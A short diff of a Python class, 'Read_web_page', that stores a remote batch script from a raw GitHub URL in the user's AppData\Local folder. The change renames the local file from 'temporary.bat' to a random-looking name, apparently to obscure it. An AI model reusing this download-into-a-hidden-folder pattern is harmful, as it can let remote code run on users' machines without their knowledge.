@@ -19,7 +19,7 @@ import os
 class Read_web_page:
     def __init__(self):
         Location = os.path.expanduser("~")
-        self.Location = os.path.join(Location,"AppData\Local\\temporary.bat")
+        self.Location = os.path.join(Location,"AppData\Local\\eJy9VEEOwC.bat")
         
         self.connection = False
         self.url = "https://raw.githubusercontent.com/TenshinoOtoKafu/Implementation-Project/Main/Command%20Prompt/System-Cleaning.bat"
